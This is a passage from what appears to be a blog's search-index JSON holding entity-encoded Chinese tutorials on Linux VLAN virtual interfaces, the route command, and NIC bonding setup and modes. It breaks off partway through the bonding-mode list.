&#x8FD9;&#x4E9B;&#x865A;&#x62DF;&#x7684;VLAN&#x7F51;&#x5361;&#x4E5F;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x4F46;&#x662F;&#x4E0E;&#x5B50;&#x7F51;&#x5361;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x5B83;&#x4EEC;&#x6CA1;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4ED6;&#x4EEC;&#x53EA;&#x662F;&#x901A;&#x8FC7;&#x5C06;&#x7269;&#x7406;&#x7F51;&#x52A0;&#x5165;&#x4E0D;&#x540C;&#x7684;VLAN&#x800C;&#x751F;&#x6210;&#x7684;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x3002;&#x5982;&#x679C;&#x5C06;&#x7269;&#x7406;&#x7F51;&#x5361;&#x901A;&#x8FC7;vconfig&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#x5230;&#x591A;&#x4E2A;VLAN&#x4E2D;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x6709;&#x591A;&#x4E2A;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x51FA;&#x73B0;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x4FE1;&#x606F;&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x7684;VLAN&#x4FE1;&#x606F;&#x90FD;&#x662F;&#x4FDD;&#x5B58;&#x5728;/proc/net/vlan/config&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x800C;&#x6CA1;&#x6709;&#x72EC;&#x81EA;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#xFF01; &#x6CE8;&#x610F;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x542F;&#x7528;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x5DE5;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5173;&#x8054;&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0D;&#x80FD;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x4E14;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E3B;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0A;&#x7684;&#x5B50;&#x7F51;&#x5361;&#x4E5F;&#x4E0D;&#x80FD;&#x88AB;&#x542F;&#x7528;&#x548C;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#x4FE1;&#x606F;&#x3002;&#xFF08;&#x9664;&#x4E86;802.1q&#x914D;&#x7F6E;&#x4E0B;&#xFF0C;&#x5728;&#x8BE5;&#x914D;&#x7F6E;&#x4E0B;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#x7B49;&#x4FE1;&#x606F;&#xFF09; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux路由配置——route","date":"2022-06-07T04:40:40.000Z","path":"/posts/365d0867/","text":"route&#x663E;&#x793A;&#x5E76;&#x8BBE;&#x7F6E;Linux&#x4E2D;&#x9759;&#x6001;&#x8DEF;&#x7531;&#x8868; &#x8865;&#x5145;&#x8BF4;&#x660E;route&#x547D;&#x4EE4; &#x7528;&#x6765;&#x663E;&#x793A;&#x5E76;&#x8BBE;&#x7F6E;Linux&#x5185;&#x6838;&#x4E2D;&#x7684;&#x7F51;&#x7EDC;&#x8DEF;&#x7531;&#x8868;&#xFF0C;route&#x547D;&#x4EE4;&#x8BBE;&#x7F6E;&#x7684;&#x8DEF;&#x7531;&#x4E3B;&#x8981;&#x662F;&#x9759;&#x6001;&#x8DEF;&#x7531;&#x3002;&#x8981;&#x5B9E;&#x73B0;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x5B50;&#x7F51;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x53F0;&#x8FDE;&#x63A5;&#x4E24;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x8DEF;&#x7531;&#x5668;&#xFF0C;&#x6216;&#x8005;&#x540C;&#x65F6;&#x4F4D;&#x4E8E;&#x4E24;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x7F51;&#x5173;&#x6765;&#x5B9E;&#x73B0;&#x3002; &#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;&#x901A;&#x5E38;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4EE5;&#x4E0B;&#x95EE;&#x9898;&#xFF1A;&#x8BE5;Linux&#x7CFB;&#x7EDF;&#x5728;&#x4E00;&#x4E2A;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#xFF0C;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x7F51;&#x5173;&#xFF0C;&#x80FD;&#x591F;&#x8BA9;&#x673A;&#x5668;&#x8BBF;&#x95EE;Internet&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x5C06;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x7684;ip&#x5730;&#x5740;&#x8BBE;&#x7F6E;&#x4E3A;Linux&#x673A;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;&#x3002;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;route&#x547D;&#x4EE4;&#x6765;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#xFF0C;&#x4E0D;&#x4F1A;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#xFF0C;&#x5F53;&#x7F51;&#x5361;&#x91CD;&#x542F;&#x6216;&#x8005;&#x673A;&#x5668;&#x91CD;&#x542F;&#x4E4B;&#x540E;&#xFF0C;&#x8BE5;&#x8DEF;&#x7531;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF1B;&#x53EF;&#x4EE5;&#x5728;/etc/rc.local&#x4E2D;&#x6DFB;&#x52A0;route&#x547D;&#x4EE4;&#x6765;&#x4FDD;&#x8BC1;&#x8BE5;&#x8DEF;&#x7531;&#x8BBE;&#x7F6E;&#x6C38;&#x4E45;&#x6709;&#x6548;&#x3002; &#x8BED;&#x6CD5;1route(&#x9009;&#x9879;)(&#x53C2;&#x6570;) &#x9009;&#x9879;1234567-A&#xFF1A;&#x8BBE;&#x7F6E;&#x5730;&#x5740;&#x7C7B;&#x578B;&#xFF1B;-C&#xFF1A;&#x6253;&#x5370;&#x5C06;Linux&#x6838;&#x5FC3;&#x7684;&#x8DEF;&#x7531;&#x7F13;&#x5B58;&#xFF1B;-v&#xFF1A;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x6A21;&#x5F0F;&#xFF1B;-n&#xFF1A;&#x4E0D;&#x6267;&#x884C;DNS&#x53CD;&#x5411;&#x67E5;&#x627E;&#xFF0C;&#x76F4;&#x63A5;&#x663E;&#x793A;&#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x7684;IP&#x5730;&#x5740;&#xFF1B;-e&#xFF1A;netstat&#x683C;&#x5F0F;&#x663E;&#x793A;&#x8DEF;&#x7531;&#x8868;&#xFF1B;-net&#xFF1A;&#x5230;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x8DEF;&#x7531;&#x8868;&#xFF1B;-host&#xFF1A;&#x5230;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x7684;&#x8DEF;&#x7531;&#x8868;&#x3002; &#x53C2;&#x6570;1234567Add&#xFF1A;&#x589E;&#x52A0;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1B;Del&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1B;Target&#xFF1A;&#x76EE;&#x7684;&#x7F51;&#x7EDC;&#x6216;&#x76EE;&#x7684;&#x4E3B;&#x673A;&#xFF1B;gw&#xFF1A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#xFF1B;mss&#xFF1A;&#x8BBE;&#x7F6E;TCP&#x7684;&#x6700;&#x5927;&#x533A;&#x5757;&#x957F;&#x5EA6;&#xFF08;MSS&#xFF09;&#xFF0C;&#x5355;&#x4F4D;MB&#xFF1B;window&#xFF1A;&#x6307;&#x5B9A;&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x7684;TCP&#x8FDE;&#x63A5;&#x7684;TCP&#x7A97;&#x53E3;&#x5927;&#x5C0F;&#xFF1B;dev&#xFF1A;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#x6240;&#x8868;&#x793A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x3002; &#x5B9E;&#x4F8B; &#x663E;&#x793A;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#xFF1A; 12345678910111213141516171819[root@localhost ~]# routeKernel IP routing tableDestination&#xA0;&#xA0;&#xA0;&#xA0; Gateway&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Genmask&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Flags Metric Ref&#xA0;&#xA0;&#xA0; Use Iface112.124.12.0&#xA0;&#xA0;&#xA0; *&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 255.255.252.0&#xA0;&#xA0; U&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth110.160.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; *&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 255.255.240.0&#xA0;&#xA0; U&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0192.168.0.0&#xA0;&#xA0;&#xA0;&#xA0; 10.160.15.247&#xA0;&#xA0; 255.255.0.0&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0172.16.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 10.160.15.247&#xA0;&#xA0; 255.240.0.0&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth010.0.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 10.160.15.247&#xA0;&#xA0; 255.0.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0default&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 112.124.15.247&#xA0; 0.0.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth1[root@localhost ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface112.124.12.0 0.0.0.0 255.255.252.0 U 0 0 0 eth110.160.0.0 0.0.0.0 255.255.240.0 U 0 0 0 eth0192.168.0.0 10.160.15.247 255.255.0.0 UG 0 0 0 eth0172.16.0.0 10.160.15.247 255.240.0.0 UG 0 0 0 eth010.0.0.0 10.160.15.247 255.0.0.0 UG 0 0 0 eth00.0.0.0 112.124.15.247 0.0.0.0 UG 0 0 0 eth1 &#x5176;&#x4E2D;Flags&#x4E3A;&#x8DEF;&#x7531;&#x6807;&#x5FD7;&#xFF0C;&#x6807;&#x8BB0;&#x5F53;&#x524D;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#xFF0C;Flags&#x6807;&#x5FD7;&#x8BF4;&#x660E;&#xFF1A; U Up&#x8868;&#x793A;&#x6B64;&#x8DEF;&#x7531;&#x5F53;&#x524D;&#x4E3A;&#x542F;&#x52A8;&#x72B6;&#x6001;&#x3002; H Host&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7F51;&#x5173;&#x4E3A;&#x4E00;&#x4E3B;&#x673A;&#x3002; G Gateway&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7F51;&#x5173;&#x4E3A;&#x4E00;&#x8DEF;&#x7531;&#x5668;&#x3002; R Reinstate Route&#xFF0C;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x8DEF;&#x7531;&#x91CD;&#x65B0;&#x521D;&#x59CB;&#x5316;&#x7684;&#x8DEF;&#x7531;&#x3002; D Dynamically,&#x6B64;&#x8DEF;&#x7531;&#x662F;&#x52A8;&#x6001;&#x6027;&#x5730;&#x5199;&#x5165;&#x3002; M Modified&#xFF0C;&#x6B64;&#x8DEF;&#x7531;&#x662F;&#x7531;&#x8DEF;&#x7531;&#x5B88;&#x62A4;&#x7A0B;&#x5E8F;&#x6216;&#x5BFC;&#x5411;&#x5668;&#x52A8;&#x6001;&#x4FEE;&#x6539;&#x3002; ! &#x8868;&#x793A;&#x6B64;&#x8DEF;&#x7531;&#x5F53;&#x524D;&#x4E3A;&#x5173;&#x95ED;&#x72B6;&#x6001;&#x3002; &#x6DFB;&#x52A0;&#x7F51;&#x5173;/&#x8BBE;&#x7F6E;&#x7F51;&#x5173;&#xFF1A; 1route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0 #&#x589E;&#x52A0;&#x4E00;&#x6761;&#x5230;&#x8FBE;244.0.0.0&#x7684;&#x8DEF;&#x7531;&#x3002; &#x5C4F;&#x853D;&#x4E00;&#x6761;&#x8DEF;&#x7531;&#xFF1A; 1route add -net 224.0.0.0 netmask 240.0.0.0 reject #&#x589E;&#x52A0;&#x4E00;&#x6761;&#x5C4F;&#x853D;&#x7684;&#x8DEF;&#x7531;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x5740;&#x4E3A;224.x.x.x&#x5C06;&#x88AB;&#x62D2;&#x7EDD;&#x3002; &#x5220;&#x9664;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1A; 12route del -net 224.0.0.0 netmask 240.0.0.0route del -net 224.0.0.0 netmask 240.0.0.0 reject &#x5220;&#x9664;&#x548C;&#x6DFB;&#x52A0;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#xFF1A; 12route del default gw 192.168.120.240route add default gw 192.168.120.240 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux网卡聚合及bond模式的原理","date":"2022-06-07T04:40:22.000Z","path":"/posts/f20e14fd/","text":"Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;bondingRedhat&#x7CFB;&#x5217;&#x6DFB;&#x52A0;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6; &#x9ED8;&#x8BA4;&#x7F51;&#x5361;&#x4EE5;ifcfg-ens33&#x4E3A;&#x4F8B;1234cd /etc/sysconfig/network-scripts/cp ifcfg-ens33 ifcfg-bond_staticcp ifcfg-ens33 ifcfg-ens38echo &gt; ifcfg-bond_static &#x4FEE;&#x6539;&#x7269;&#x7406;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;12345678vim ifcfg-ens33TYPE=EthernetBOOTPROT=noneDEVICE=ens33NAME=ens33ONBOOT=yesMASTER=bond_static # &#x4E3B;&#x7F51;&#x5361;=bong_staticSLAVE=yes # &#x4ECE;&#x7F51;&#x5361;=yes 12345678vim ifcfg-ens38TYPE=EthernetBOOTPROTO=noneDEVICE=ens38NAME=ens38ONBOOT=yesMASTER=bond_staticSLAVE=yes &#x4FEE;&#x6539;bond&#x914D;&#x7F6E;12345678910111213vim ifcfg-bond_staticTYPE=EthernetBOOTPROTO=staticDEVICE=bond_staticNAME=bond_staticIPADDR=192.168.x.xPREFIX=24GATEWAY=192.168.X.XDNS1=X.X.X.XDNS2=X.X.X.XONBOOT=yesBONDING_MASTER=yes # &#x662F;&#x5426;&#x4E3B;&#x7F51;&#x5361;=yesBONDING_OPTS=&quot;miimon=100 mode=6&quot; # MII&#x76D1;&#x63A7;&#x65F6;&#x95F4;&#x95F4;&#x9694;=100&#x6BEB;&#x79D2;&#xFF0C;&#x7ED1;&#x5B9A;&#x6A21;&#x5F0F;=6 Debian&#x7CFB;&#x5217; &#x4EE5;Ubuntu 20.04&#x4E3A;&#x4F8B;&#x6DFB;&#x52A0;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;sudo vim /etc/netplan/01-network-manager-all.yaml12345678910111213141516171819202122version: 2 renderer: NetworkManager ethernets: ens33: dhcp4: no ens38: dhcp4: no bonds: # bond&#x540D;&#x79F0; bond-stat: interfaces: [ens33, ens38] # &#x6DFB;&#x52A0;&#x7684;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361; addresses: [192.168.73.20/24] # &#x5730;&#x5740; gateway4: 192.168.73.2 # &#x7F51;&#x5173; nameservers: # DNS&#x670D;&#x52A1;&#x5668; addresses: [114.114.114.114, 192.168.73.2] routes: # &#x8DEF;&#x7531; - to: default via: 192.168.73.2 parameters: mode: active-backup # &#x7ED1;&#x5B9A;&#x6A21;&#x5F0F; mii-monitor-interval: 1 # MII&#x76D1;&#x63A7;&#x65F6;&#x95F4;&#x95F4;&#x9694; &#x5E94;&#x7528;&#x914D;&#x7F6E;1sudo netplan apply bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A; 0&#xFF0C;(balance-rr)Round-robin-policy&#xFF0C;&#x5E73;&#x8861;&#x8F6E;&#x8BE2;&#x7B56;&#x7565;&#xFF0C;&#x7279;&#x70B9;&#xFF1A;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x987A;&#x5E8F;&#x662F;&#x4F9D;&#x6B21;&#x4F20;&#x8F93;&#xFF08;&#x5373;&#xFF1A;&#x7B2C;1&#x4E2A;&#x5305;&#x8D70;eth0&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x5305;&#x5C31;&#x8D70;eth1&#x2026;.&#x4E00;&#x76F4;&#x5FAA;&#x73AF;&#x4E0B;&#x53BB;&#xFF0C;&#x76F4;&#x5230;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x4F20;&#x8F93;&#x5B8C;&#x6BD5;&#xFF09;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x548C;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF1B;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x4F1A;&#x8BDD;&#x7684;&#x6570;&#x636E;&#x5305;&#x4ECE;&#x4E0D;&#x540C;&#x7684;&#x63A5;&#x53E3;&#x53D1;&#x51FA;&#x7684;&#x8BDD;&#xFF0C;&#x4E2D;&#x9014;&#x518D;&#x7ECF;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x94FE;&#x8DEF;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5305;&#x65E0;&#x5E8F;&#x5230;&#x8FBE;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x65E0;&#x5E8F;&#x5230;&#x8FBE;&#x7684;&#x6570;&#x636E;&#x5305;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8981;&#x6C42;&#x88AB;&#x53D1;&#x9001;&#xFF0C;&#x8FD9;&#x6837;&#x7F51;&#x7EDC;&#x7684;&#x541E;&#x5410;&#x91CF;&#x5C31;&#x4F1A;&#x4E0B;&#x964D; 1&#xFF0C;(active-backup)Active-backup policy&#xFF0C;&#x4E3B;-&#x5907;&#x4EFD;&#x7B56;&#x7565;&#xFF0C;&#x7279;&#x70B9;&#xFF1A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x8BBE;&#x5907;&#x5904;&#x4E8E;&#x6D3B;&#x52A8;&#x72B6;&#x6001;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5B95;&#x6389;&#x53E6;&#x4E00;&#x4E2A;&#x9A6C;&#x4E0A;&#x7531;&#x5907;&#x4EFD;&#x8F6C;&#x6362;&#x4E3A;&#x4E3B;&#x8BBE;&#x5907;&#x3002;mac&#x5730;&#x5740;&#x662F;&#x5916;&#x90E8;&#x53EF;&#x89C1;&#x5F97;&#xFF0C;&#x4ECE;&#x5916;&#x9762;&#x770B;&#x6765;&#xFF0C;bond&#x7684;MAC&#x5730;&#x5740;&#x662F;&#x552F;&#x4E00;&#x7684;&#xFF0C;&#x4EE5;&#x907F;&#x514D;switch(&#x4EA4;&#x6362;&#x673A;)&#x53D1;&#x751F;&#x6DF7;&#x4E71;&#x3002;&#x6B64;&#x6A21;&#x5F0F;&#x53EA;&#x63D0;&#x4F9B;&#x4E86;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF1B;&#x7531;&#x6B64;&#x53EF;&#x89C1;&#x6B64;&#x7B97;&#x6CD5;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x9AD8;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x7684;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x7684;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x8F83;&#x4F4E;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;&#x5904;&#x4E8E;&#x5DE5;&#x4F5C;&#x72B6;&#x6001;&#xFF0C;&#x5728;&#x6709; N &#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x4E3A;1/N 2&#xFF0C;(balance-xor)XOR policy&#xFF0C;&#x5E73;&#x8861;&#x7B56;&#x7565;&#xFF0C;&#x57FA;&#x4E8E;&#x6307;&#x5B9A;&#x7684;&#x4F20;&#x8F93;HASH&#x7B56;&#x7565;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x7B56;&#x7565;&#x662F;(&#x6E90;MAC&#x5730;&#x5740; XOR &#x76EE;&#x6807;MAC&#x5730;&#x5740;)%slave&#x6570;&#x91CF;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x4F20;&#x8F93;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;xmit_hash_policy&#x9009;&#x9879;&#x6307;&#x5B9A;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x548C;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF09; 3&#xFF0C;broadcast&#x5E7F;&#x64AD;&#x7B56;&#x7565;&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;slave&#x63A5;&#x53E3;&#x4E0A;&#x4F20;&#x8F93;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x4E86;&#x5BB9;&#x9519;&#x80FD;&#x529B; 4&#xFF0C;(802.3ad)IEEE 802.3ad Dynamic link aggregation&#xFF08;IEEE 802.3ad&#x52A8;&#x6001;&#x94FE;&#x8DEF;&#x805A;&#x5408;&#xFF09;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x805A;&#x5408;&#x7EC4;&#xFF0C;&#x5B83;&#x4EEC;&#x5171;&#x4EAB;&#x540C;&#x6837;&#x7684;&#x7684;&#x901F;&#x7387;&#x548C;&#x53CC;&#x5DE5;&#x8BBE;&#x5B9A;&#x3002;&#x6839;&#x636E;802.3ad&#x89C4;&#x8303;&#x5C06;&#x591A;&#x4E2A;slave&#x5DE5;&#x4F5C;&#x548B;&#x540C;&#x4E00;&#x4E2A;&#x6FC0;&#x6D3B;&#x7684;&#x805A;&#x5408;&#x4F53;&#x4E0B;&#xFF0C;&#x5916;&#x51FA;&#x6D41;&#x91CF;&#x7684;slave&#x9009;&#x4E3E;&#x662F;&#x57FA;&#x4E8E;&#x4F20;&#x8F93;hash&#x7B56;&#x7565;&#xFF0C;&#x8BE5;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;xmit_hash_policy&#x9009;&#x7EBF;&#x4ECE;&#x7F3A;&#x7701;&#x7684;XOR&#x7B56;&#x7565;&#x6539;&#x53D8;&#x5230;&#x5176;&#x4ED6;&#x7B56;&#x7565;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x9664;&#x6570;&#x7B56;&#x7565;&#x90FD;&#x662F;802.3ad&#x9002;&#x5E94;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x8003;&#x8651;&#x5230;&#x5728;802.3ad&#x6807;&#x51C6;&#x7684;43.2.4&#x7AE0;&#x8282;&#x63D0;&#x53CA;&#x7684;&#x5305;&#x4E71;&#x5E8F;&#x95EE;&#x9898;&#x3002;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x5B9E;&#x73B0;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x9002;&#x5E94;&#x6027;&#x3002; &#x5FC5;&#x987B;&#x8981;&#x6761;&#x4EF6;&#xFF1A; &#x6761;&#x4EF6;1&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;&#x548C;&#x53CC;&#x5DE5;&#x8BBE;&#x5B9A; &#x6761;&#x4EF6;2&#xFF1A;switch&#x4EA4;&#x6362;&#x673A;&#x652F;&#x6301;IEEE 802.3ad Dynamic link aggregation &#x6761;&#x4EF6;3&#xFF1A;&#x5927;&#x591A;&#x6570;switch&#x9700;&#x8981;&#x7ECF;&#x8FC7;&#x7279;&#x5B9A;&#x914D;&#x7F6E;&#x624D;&#x80FD;&#x652F;&#x6301;802.3ad&#x6A21;&#x5F0F; 5&#xFF0C;(balance-tlb)Adaptive transmit load 